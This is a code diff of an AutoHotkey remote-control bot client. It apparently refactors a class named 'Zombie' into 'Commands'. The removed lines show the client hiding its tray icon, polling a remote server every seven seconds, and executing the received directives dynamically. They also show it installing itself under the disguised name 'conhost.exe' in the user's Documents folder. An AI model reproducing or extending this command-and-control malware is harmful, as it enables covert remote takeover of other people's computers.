@@ -1,65 +1,6 @@
-﻿#include TTS.ahk
-global version := "1.2 Release"
-global debug := false
-
-
-; @release mode
-#NoTrayIcon
-
-; @debug mode
-
-; Main
-
-global whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
-; @update if available
-tryUpdate()
-
-loop{
-	try{
-		whr.Open("GET", Connect.receiveLink, false)
-		whr.SetRequestHeader("X-Requested-With", "XMLHttpRequest")
-		whr.SetRequestHeader("Content-Type", "text/html;charset=UTF-8")
-		whr.Send()
-		
-		; Zombie.notation("test")
-		; break
-		
-		response := Connect.utfDecode( Connect.urlDecode(whr.ResponseText) )
-		Connect.parseResponse(response)
-	}
-	catch{
-		;nothing :)
-	}
-	sleep 7000
-}
-ObjRelease(whr)
-
-; Classes / Objects / Methods
-; @Zombie
-class Zombie{
-	static name := A_ComputerName "-" A_UserName
-	
-	getName(){
-		return this.name
-	}
-	
-	getInfo(){
-		return A_OSVersion
-	}
-	
-	;A_WinDir "|" A_StartupCommon | A_Desktop
-	doCommand(command){
-		command := strSplit(command, "::")
-		directive := command[1]
-		parameter := command[2]
-		if(directive != "doCommand"){
-			this[directive](parameter) ; call function dynamicaly
-		}
-	}
-	
-	; @Received commands
-	notation(parameter){
-		whr.Open("GET", Connect.getNotationLink(parameter), false)
+class Commands{
+	sendNotation(parameter){
+		whr.Open("GET", Connect.prepareNotationLink(parameter), false)
 		whr.SetRequestHeader("X-Requested-With", "XMLHttpRequest")
 		whr.SetRequestHeader("Content-Type", "text/html;charset=UTF-8")
 		whr.Send()
@@ -194,23 +135,3 @@ class Zombie{
 		soundSet, parameter
 	}
 }
-
-tryUpdate(){
-	if(A_ScriptName == "conhost.ahk" or A_ScriptName == "conhost.exe"){
-		fileDelete, %A_MyDocuments%\Conhost\update.exe
-	}
-	else if(A_ScriptName == "update.ahk" or A_ScriptName == "update.exe"){
-		fileCopy, %A_ScriptName%, %A_MyDocuments%\Conhost\conhost.exe, 1
-		Zombie.notation("updated to version: " . version)
-		run conhost.exe
-		exitApp
-	}
-}
-
-#include Connect.ahk
-
-^r::
-if(debug){
-	reload
-}
-return
